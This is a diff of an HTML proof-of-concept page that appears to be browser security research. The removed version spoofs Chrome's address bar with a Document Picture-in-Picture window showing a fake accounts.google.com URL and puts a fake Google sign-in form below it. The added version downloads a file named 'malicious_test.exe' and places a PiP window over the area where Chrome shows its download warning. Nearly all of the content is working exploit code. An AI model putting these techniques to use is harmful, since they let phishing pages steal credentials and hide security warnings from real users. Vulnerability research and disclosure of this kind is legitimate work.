@@ -1,95 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>PoC: Chrome Omnibox Spoofing via DPiP - FARISSAL B</title>
+    <title>Research: File Interaction Obscuration</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #1e1e1e; padding: 40px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; text-align: center; max-width: 500px; }
-        h1 { color: #4285f4; margin-bottom: 10px; }
-        p { color: #aaa; margin-bottom: 30px; }
-        #attackBtn { background: #4285f4; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.3s; font-weight: bold; width: 100%; }
-        #attackBtn:hover { background: #357ae8; transform: scale(1.02); }
-        .log-box { margin-top: 20px; background: #000; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 12px; text-align: left; color: #0f0; border: 1px solid #0f0; height: 100px; overflow-y: auto; }
-        .warning { color: #ff4444; font-weight: bold; }
+        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding-top: 100px; }
+        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: inline-block; }
+        button { background: #db4437; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h1>Security Research</h1>
-    <p>Target: Chrome Omnibox Boundary Enforcement<br>Researcher: <b>FARISSAL B</b></p>
-    
-    <button id="attackBtn">EXECUTE SPOOFING ATTACK</button>
-
-    <div class="log-box" id="logBox">
-        [SYSTEM] Awaiting user gesture...
-    </div>
+<div class="box">
+    <h2>File System Safety Test</h2>
+    <p>Testing if PiP can obscure system download warnings.</p>
+    <button id="downloadBtn">START TEST</button>
 </div>
 
 <script>
-    const logBox = document.getElementById('logBox');
-    const addLog = (msg, danger = false) => {
-        const entry = document.createElement('div');
-        entry.innerHTML = `> ${danger ? '<span class="warning">!</span> ' : ''}${msg}`;
-        logBox.appendChild(entry);
-        logBox.scrollTop = logBox.scrollHeight;
-    };
+    document.getElementById('downloadBtn').addEventListener('click', async () => {
+        // 1. Trigger Download File "Berbahaya" (Simulasi)
+        const blob = new Blob(["test content"], { type: 'application/x-msdownload' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'malicious_test.exe';
+        a.click();
 
-    document.getElementById('attackBtn').addEventListener('click', async () => {
-        try {
-            // 1. Copy payload to clipboard (Alesandro Style)
-            await navigator.clipboard.writeText("https://accounts.google.com/signin/v2/identifier");
-            addLog("Payload copied to clipboard.");
+        // 2. Langsung buka PiP buat nutupin area notifikasi (biasanya kanan atas atau bawah)
+        const pipWin = await documentPictureInPicture.requestWindow({
+            width: 400,
+            height: 200,
+        });
 
-            // 2. Open Document PiP
-            const pipWin = await documentPictureInPicture.requestWindow({
-                width: 900, // Lebar menutupi Omnibox
-                height: 120, // Pas untuk area bar alamat
-            });
+        // Posisikan PiP di area biasanya Chrome munculin peringatan download
+        // Coba ganti-ganti koordinat ini pas ngetes
+        pipWin.moveTo(window.screen.width - 450, 50); 
 
-            addLog("PiP Window Initialized.");
-
-            // 3. Inject Spoofing UI
-            pipWin.document.body.style.margin = "0";
-            pipWin.document.body.style.overflow = "hidden";
-            pipWin.document.body.innerHTML = `
-                <div style="background: #ffffff; height: 100vh; display: flex; align-items: center; padding: 0 20px; font-family: sans-serif; border-bottom: 2px solid #4285f4; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
-                    <div style="background: #f1f3f4; border-radius: 24px; padding: 8px 20px; flex-grow: 1; display: flex; align-items: center; gap: 12px; border: 1px solid #dfe1e5;">
-                        <img src="https://www.google.com/favicon.ico" width="18">
-                        <span style="color: #202124; font-size: 15px;">https://accounts.google.com/signin/v2</span>
-                        <span style="color: #5f6368; margin-left: auto;">🔒</span>
-                    </div>
-                </div>
-            `;
-
-            // 4. Persistence & Boundary Monitoring (The Evidence)
-            const checkBypass = setInterval(() => {
-                const y = pipWin.screenY;
-                if (y < 40) {
-                    addLog(`BOUNDARY BYPASS DETECTED! Y: ${y}`, true);
-                }
-                if (pipWin.closed) {
-                    clearInterval(checkBypass);
-                    addLog("Attack Window Closed.");
-                }
-            }, 500);
-
-            // 5. Interaction Test (Phishing Form di halaman utama)
-            document.body.innerHTML = `
-                <div class="card">
-                    <h2 style="color:#fff">Sign in</h2>
-                    <p>Use your Google Account</p>
-                    <input type="email" placeholder="Email or phone" style="width:100%; padding:15px; margin-bottom:10px; border-radius:5px; border:1px solid #333; background:#111; color:#fff;">
-                    <input type="password" placeholder="Enter your password" style="width:100%; padding:15px; margin-bottom:20px; border-radius:5px; border:1px solid #333; background:#111; color:#fff;">
-                    <button style="background:#4285f4; color:#fff; border:none; padding:12px 24px; border-radius:5px; width:100%; font-weight:bold;">Next</button>
-                    <p style="margin-top:20px; color:#4285f4; font-size:12px;">Instruction: Drag the PiP window to the top and try to type here.</p>
-                </div>
-            `;
-
-        } catch (e) {
-            addLog("Error: " + e.message, true);
-        }
+        pipWin.document.body.innerHTML = `
+            <div style="background: #4285f4; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; font-weight: bold;">
+                DOWNLOAD IN PROGRESS... PLEASE WAIT
+            </div>
+        `;
     });
 </script>
 </body>
